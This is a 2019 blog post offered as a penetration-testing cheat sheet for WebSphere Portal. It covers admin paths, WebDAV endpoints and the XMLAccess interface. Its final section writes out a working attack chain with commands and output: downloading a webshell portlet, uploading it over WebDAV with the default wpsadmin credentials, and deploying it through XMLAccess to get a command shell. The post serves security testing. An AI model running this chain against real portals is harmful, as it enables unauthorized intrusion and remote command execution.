+++
date = "2019-03-27T00:00:00+00:00"
title = "Websphere Portal for penetration testers"
note = "When i wrote this, Websphere portal had just been sold from IBM to HCL Technologies. The already scarce documentation became even worse, while this CMS was still powering a significant amount of banking and public administration applications."
toc = false
+++

There are few resources and even fewer tools available to test the security of a WebSphere Portal website, despite its widespread use in corporate environments. Much of the content here may seem obvious to those who work daily with this extensive software. However, the aim is to provide a practical cheat sheet rather than a detailed guide.

## Info
WebSphere Portal (WPS) is a CMS that operates on top of WebSphere Application Server (WAS). Written primarily in Java and heavily reliant on XML, it is as complex and obscure as many IBM products. Its vast documentation often proves difficult to navigate during the tight timeframes of a penetration test, even when information about the deployment, such as credeentials are found or known.

Like Tomcat, WAS includes an administrative interface for managing and deploying applications. This console typically operates on ports 9060 (HTTP) or 9043 (HTTPS). In most configurations, the console will not be exposed to the internet for publicly facing websites. However, this may differ in internal (intranet) deployments.

Additionally, WPS deploys standard administrative portlets by default, which could provide an attack surface. We'll explore interesting URLs and paths in the next sections.

The main objective is to obtain at least a directory traversal vulnerability and from there gain code execution. An example of this type of vulnerability in WPS is [CVE-2012-4834](https://nvd.nist.gov/vuln/detail/CVE-2012-4834) and although old it might still be found on legacy websites. This kind of vulnerabilities can of course also be in custom portlets, JSP pages or other dynamic content. Once there's an arbitrary file read it should also be possible to get a lot of useful additional information, including JDBC objects, LDAP binds and of course administrative credentials.

### Url Scheme
[This is an interesting read](https://www.optiv.com/explore-optiv-insights/blog/decoding-ibm-webshere-portlet-urls) and there's also a Burp plugin. URLs can also be plaintext.

### Interesting paths
Here's a short list of interesting paths and what they means (assuming that the base is `/wps`:

 * `/wps/portal` - Default main portlet
 * `/wps/login` - Default login portlet
 * `/wps/proxy` - Default proxy portlet. Normally there's a few whitelisted sites including `/wps/proxy/http/www.ibm.com`
 * `/wps/federated`

### WebDAV
By default, there are multiple WebDAV endpoints as described [here](https://help.hcltechsw.com/digital-experience/9.5/admin-system/mash_webdav_store.html).

Visit `/wps/mycontenthandler/!ut/p/model/service-document` to list the available endpoints. (this page might require an user)

Sample output:
{{< highlight xml >}}
<app:collection href="/wps/mycontenthandler/!ut/p/dav/fs-type1/fs-type1">
<atom:title>fs-type1-fs-type1</atom:title>
<app:categories fixed="yes">
<atom:category term="webdav"/>
<atom:category term="filestore"/>
<atom:category term="mashups"/>
</app:categories>
</app:collection>
<app:collection href="/wps/mycontenthandler/!ut/p/dav/fs-type1/users/wpsadmin">
<atom:title>fs-type1-user</atom:title>
<app:categories fixed="yes">
<atom:category term="webdav"/>
<atom:category term="filestore"/>
<atom:category term="mashups"/>
<atom:category term="user"/>
</app:categories>
</app:collection>
{{< / highlight >}}

As we can see here's the user filestore meaning that also low privileged users should have write permissions in their own directory.

Other administrative WebDAV endpoints includes:

 * `/wps/mycontenthandler/dav/themelist`
 * `/wps/mycontenthandler/dav/skinlist`
 * `/wps/mycontenthandler/dav/contentmodel/wps.content.root/`
 * `/wps/mycontenthandler/dav/content/libraries/`

[Here are some additional information.](http://blog.sivavaka.com/2011/03/webdav-websphere-portal.html)

### XMLAccess

XMLAccess is an administrative configuration endpoint, based on XML, which is commonly exposed on the internet at the path `/wps/config`. If that path requires authorization or returns a `405` code for a GET request than the interface is available and administrative credentials are required.

For ease of use, [I have extracted the XMLAccess utility and modified it to work standalone](https://git.lsd.cat/g/xmlaccess).

Here's the standard usage:

{{< highlight bash >}}
user@host#: ./xmlaccess.sh -url http://<target>/wps/config -in xml/ExportAllUsers.xml  -user wpsadmin -password wpsadmin
Licensed Materials - Property of IBM, 5724-E76, 5724-E77, 5724-I29 and 5655-Y16, (C) Copyright IBM Corp. 2001, 2014 - All Rights reserved. US Government Users Restricted Rights - Use, duplication or disclosure restricted by GSA ADP Schedule Contract with IBM Corp.
EJPXB0006I: Connecting to URL http://116.203.252.192:30015/wps/config
EJPXB0002I: Reading input file /tmp/xmlaccess/xml/ExportAllUsers.xml
{{< / highlight >}}
{{< highlight xml >}}
<?xml version="1.0" encoding="UTF-8"?>
<!-- IBM WebSphere Portal/8.5 build 20180912-1300 exported on Sat Jul 13 15:08:46 UTC 2019 from 2b0019a69dd7/172.17.0.2 virtual portal: none (default virtual portal) -->
<!-- 1 [user Z9eAe1JCC3JL6P1C2MM8CN9E4JMG6G1C0JM4723CAJMGCG9CE3OCCJ1P83OG633 name=uid=wpsadmin,o=defaultWIMFileBasedRealm] -->
<!-- 2 [group Z8eAeIHPA3P074BO6MMS6PHPAMMG61BD6MM4CI1ECMM47IPC63IDCGPDA3JLC43 name=cn=wpsadmins,o=defaultWIMFileBasedRealm] -->
<request build="20180912-1300" type="update" version="8.5.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:noNamespaceSchemaLocation="PortalConfig_8.5.0.xsd">
    <portal action="locate">
        <user action="update" domain="rel" name="uid=wpsadmin,o=defaultWIMFileBasedRealm" objectid="Z9eAe1JCC3JL6P1C2MM8CN9E4JMG6G1C0JM4723CAJMGCG9CE3OCCJ1P83OG633">
            <parameter name="sn" type="string" update="set"><![CDATA[wpsadmin]]></parameter>
        </user>
        <group action="update" domain="rel" name="cn=wpsadmins,o=defaultWIMFileBasedRealm" objectid="Z8eAeIHPA3P074BO6MMS6PHPAMMG61BD6MM4CI1ECMM47IPC63IDCGPDA3JLC43">
            <access-control externalized="false" owner="undefined" private="false"/>
            <member-user id="uid=wpsadmin,o=defaultWIMFileBasedRealm" update="set"/>
        </group>
    </portal>
    <status element="all" result="ok"/>
</request>
EJPXB0020I: The request was processed successfully on the server.
{{< / highlight >}}

Available examples are in the `xml` folder in the repo.

### Code execution
Here's an example of how to gain code execution knowing the administrative credentials and using WebDAV and XMLAccess. In the case that the target server does not block outbound connections, it might be possible to skip the WebDAV usage and deploy a portlet directly via HTTP.

A portlet needs some more configuration files than a standard Tomcat WAR application. [A useful example can be found at this link](https://github.com/kost/webshell-portlet). In this case, it is easier to add a JSP file to the WAR and use it as a command shell.

Prepare the portlet
{{< highlight bash >}}
user@host#: wget https://github.com/kost/webshell-portlet/raw/master/bin/ExecCmd-2.0.war
user@host#: wget https://gist.githubusercontent.com/ErosLever/7445a3cfaaf80f1f5a53/raw/f14a53bd1095a387c063466167d49c20bb94050a/cmd.jsp
user@host#: mv ExecCmd-2.0.war shell.war
user@host#: zip shell.war cmd.jsp
{{< / highlight >}}


Upload it via WebDAV (cadaver is a CLI WebDAV client):
{{< highlight bash >}}
user@host#: cadaver 'http://116.203.252.192:30015/wps/mycontenthandler/!ut/p/dav/fs-type1/'
Authentication required for WPS on server `116.203.252.192':
Username: wpsadmin
Password:
dav:/wps/mycontenthandler/!ut/p/dav/fs-type1/> ls
Listing collection `/wps/mycontenthandler/!ut/p/dav/fs-type1/': succeeded.
Coll:   common-resources                    4096  Jul 13  2019
Coll:   iwidgets                            4096  Jun 26  2009
Coll:   layout-templates                    4096  Jun 26  2009
Coll:   public                              4096  Jun 26  2009
Coll:   skins                               4096  Jun 26  2009
Coll:   system                              4096  Jun 26  2009
Coll:   themes                              4096  Jul 13  2019
Coll:   users                               4096  Jun 26  2009
dav:/wps/mycontenthandler/!ut/p/dav/fs-type1/> put shell.war
Uploading shell.war to `/wps/mycontenthandler/!ut/p/dav/fs-type1/shell.war':
Progress: [=============================>] 100.0% of 6267 bytes succeeded.
dav:/wps/mycontenthandler/!ut/p/dav/fs-type1/>
{{< / highlight >}}

In the docker container, the file will end in `/opt/IBM/WebSphere/wp_profile/temp/dockerNode/WebSphere_Portal/JCRFileStore/filestore/fs-type1/shell.war`.


Now prepare the XMLAccess DeployPortlet command ans save it as `DeployPortlet.xml`:

{{< highlight xml >}}
<?xml version="1.0" encoding="UTF-8"?>
<request
    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
    xsi:noNamespaceSchemaLocation="PortalConfig_8.0.0.xsd"
    type="update"
    create-oids="true">


    <portal action="locate">

        <!-- Sample JSR 286 portlet -->
        <!-- The uid must match uid attribute of portlet-app in portlet.xml. -->
        <web-app action="create" active="true">
           <url>file:///opt/IBM/WebSphere/wp_profile/temp/dockerNode/WebSphere_Portal/JCRFileStore/filestore/fs-type1/shell.war</url>
           <context-root>/wps/shell</context-root>
        </web-app>


    </portal>
</request>
{{< / highlight >}}

And fire it:
{{< highlight bash >}}
user@host#: ./xmlaccess.sh -url http://<target>/wps/config -in DeployPortlet.xml  -user wpsadmin -password wpsadmin
Licensed Materials - Property of IBM, 5724-E76, 5724-E77, 5724-I29 and 5655-Y16, (C) Copyright IBM Corp. 2001, 2014 - All Rights reserved. US Government Users Restricted Rights - Use, duplication or disclosure restricted by GSA ADP Schedule Contract with IBM Corp.
EJPXB0006I: Connecting to URL http://116.203.252.192:30015/wps/config
EJPXB0002I: Reading input file /tmp/DeployPortlet.xml
<?xml version="1.0" encoding="UTF-8"?>
<!-- IBM WebSphere Portal/8.5 build 20180912-1300 exported on Sat Jul 13 13:42:39 UTC 2019 from 2b0019a69dd7/172.17.0.2 virtual portal: none (default virtual portal) -->
<request build="20180912-1300" type="update" version="8.5.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:noNamespaceSchemaLocation="PortalConfig_8.5.0.xsd">
    <status element="all" result="ok"/>
</request>
EJPXB0020I: The request was processed successfully on the server.
{{< / highlight >}}

The webshell will be now available at `http://<target>/wps/shell/cmd.jsp`.